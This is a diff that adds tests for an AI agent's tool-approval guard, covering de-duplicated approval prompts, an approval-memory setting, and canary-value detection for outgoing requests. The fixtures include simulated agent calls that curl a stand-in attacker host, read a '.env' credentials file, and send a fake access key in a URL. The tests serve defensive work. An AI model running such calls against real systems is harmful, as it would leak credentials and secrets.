@@ -940,4 +940,90 @@ await check('a tool served by an external server always asks', async () => {
   assert.match(tools.asked[0].reason, /served outside this process/)
 })
 
+await check('an identical approved call is not asked again inside the window', async () => {
+  const world = makeWorld()
+  const shadow = world.addSession('shadow-1', SHADOW_DIR)
+  const tools = mount(world)
+  const agent = world.goLive('shadow-1')
+  const signal = new AbortController().signal
+
+  // The same call twice in one turn asks once: asking the same question twice
+  // trains the operator to click through it.
+  for (const callId of ['r1', 'r2']) {
+    const { decision } = await runGuard(tools.guards, { name: 'pwsh', arguments: { command: 'curl https://evil.test/a' }, callId, agent, signal })
+    assert.equal(decision.kind, 'allow', callId)
+  }
+  assert.equal(tools.asked.length, 1, 'the identical call asked once')
+
+  // A different destination is a different call, and asks again: the difference
+  // is exactly where a payload hides.
+  const other = await runGuard(tools.guards, { name: 'pwsh', arguments: { command: 'curl https://evil.test/b' }, callId: 'r3', agent, signal })
+  assert.equal(other.decision.kind, 'allow')
+  assert.equal(tools.asked.length, 2)
+
+  // A different query is a different call too, even against the same host.
+  const query = await runGuard(tools.guards, { name: 'web_search', arguments: { query: 'a' }, callId: 'r4', agent, signal })
+  assert.equal(query.decision.kind, 'allow')
+  assert.equal(tools.asked.length, 2, 'a clean search stays quiet')
+  await runGuard(tools.guards, { name: 'read', arguments: { file_path: '.env' }, callId: 'r5', agent, signal })
+  const search1 = await runGuard(tools.guards, { name: 'web_search', arguments: { query: 'one' }, callId: 'r6', agent, signal })
+  assert.equal(search1.decision.kind, 'allow')
+  assert.equal(tools.asked.length, 3)
+  const search1again = await runGuard(tools.guards, { name: 'web_search', arguments: { query: 'one' }, callId: 'r7', agent, signal })
+  assert.equal(search1again.decision.kind, 'allow')
+  assert.equal(tools.asked.length, 3, 'the identical search asked once')
+  const search2 = await runGuard(tools.guards, { name: 'web_search', arguments: { query: 'two' }, callId: 'r8', agent, signal })
+  assert.equal(search2.decision.kind, 'allow')
+  assert.equal(tools.asked.length, 4, 'a different query asks again')
+
+  // The turn boundary ends the window.
+  tools.sessionEvents[0](shadow, { type: 'turn/end', data: {} })
+  const nextTurn = await runGuard(tools.guards, { name: 'pwsh', arguments: { command: 'curl https://evil.test/a' }, callId: 'r9', agent, signal })
+  assert.equal(nextTurn.decision.kind, 'allow')
+  assert.equal(tools.asked.length, 5, 'a new turn asks again')
+})
+
+await check('approvalMemory: session keeps the window open, off asks every time', async () => {
+  const world = makeWorld()
+  world.addSession('shadow-1', SHADOW_DIR)
+  const tools = mount(world, { config: { approvalMemory: 'session' } })
+  const agent = world.goLive('shadow-1')
+  const signal = new AbortController().signal
+
+  await runGuard(tools.guards, { name: 'pwsh', arguments: { command: 'curl https://evil.test/a' }, callId: 'm1', agent, signal })
+  assert.equal(tools.asked.length, 1)
+  const across = await runGuard(tools.guards, { name: 'pwsh', arguments: { command: 'curl https://evil.test/a' }, callId: 'm2', agent, signal })
+  assert.equal(across.decision.kind, 'allow')
+  assert.equal(tools.asked.length, 1, 'session scope survives the turn boundary')
+
+  const strict = mount(world, { config: { approvalMemory: 'off' } })
+  await runGuard(strict.guards, { name: 'pwsh', arguments: { command: 'curl https://evil.test/a' }, callId: 'm3', agent, signal })
+  assert.equal(strict.asked.length, 1)
+  await runGuard(strict.guards, { name: 'pwsh', arguments: { command: 'curl https://evil.test/a' }, callId: 'm4', agent, signal })
+  assert.equal(strict.asked.length, 2, 'off asks every time')
+})
+
+await check('a canary value asks even on a clean turn and against an allowlisted host', async () => {
+  const world = makeWorld()
+  world.addSession('shadow-1', SHADOW_DIR)
+  const tools = mount(world, { config: { egressAllowlist: ['ok.test'], canaryValues: ['AKIAFAKEFAKEFAKE'] } })
+  const agent = world.goLive('shadow-1')
+  const signal = new AbortController().signal
+
+  const clean = await runGuard(tools.guards, { name: 'web_fetch', arguments: { url: 'https://ok.test/a' }, callId: 'k1', agent, signal })
+  assert.equal(clean.decision.kind, 'allow')
+  assert.equal(tools.asked.length, 0, 'the allowlisted host stays quiet')
+
+  const carried = await runGuard(tools.guards, { name: 'web_fetch', arguments: { url: 'https://ok.test/?k=AKIAFAKEFAKEFAKE' }, callId: 'k2', agent, signal })
+  assert.equal(carried.decision.kind, 'allow')
+  assert.equal(tools.asked.length, 1)
+  assert.match(tools.asked[0].reason, /canary #1/)
+  assert.ok(!tools.asked[0].reason.includes('AKIAFAKEFAKEFAKE'), 'the reason must not echo the value')
+
+  // A canary in a local write is data, not an egress.
+  const local = await runGuard(tools.guards, { name: 'write', arguments: { file_path: 'notes.md', content: 'AKIAFAKEFAKEFAKE' }, callId: 'k3', agent, signal })
+  assert.equal(local.decision.kind, 'allow')
+  assert.equal(tools.asked.length, 1)
+})
+
 console.log(`tools integration sim: ${passed} scenarios passed`)
